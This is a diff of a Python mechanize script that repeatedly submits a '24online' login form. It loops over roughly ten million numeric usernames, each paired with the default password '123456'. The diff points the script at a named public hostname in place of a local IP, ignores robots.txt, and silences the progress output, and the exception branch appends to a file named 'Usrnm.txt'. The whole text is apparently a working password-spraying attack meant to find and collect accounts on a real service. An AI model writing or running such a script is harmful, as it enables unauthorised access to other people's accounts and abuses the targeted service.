@@ -15,26 +15,24 @@ class SanitizeHandler(mechanize.BaseHandler):
 
 filename = "Usrnm.txt"
 
-#br = mechanize.Browser()
-
-br = mechanize.Browser(factory=mechanize.RobustFactory())
+br = mechanize.Browser()
 br.add_handler(SanitizeHandler())
 br.set_handle_equiv(True)
 br.set_handle_redirect(True)
 br.set_handle_referer(True)
 br.set_handle_robots(False)
 
-br.open("http://172.16.16.16/24online/webpages/client.jsp")
+br.open("https://mahe3.dvois.com/24online/webpages/client.jsp")
 #for num in range(160945452,161020000):#lower cap, upper cap
-for num in range(160907387, 160907389):
+for num in range(170907389, 180907389):
 		try:
 			n=str(num)
-			print(n)
+			#print(n)
 			br.select_form(nr=0)
 			br.form['username'] = n		
 			br.form['password']  = '123456'
 			response=br.submit()
-			print("Done")			
+			#print("Done")			
 			
 		except:
 			target = open(filename, 'a')
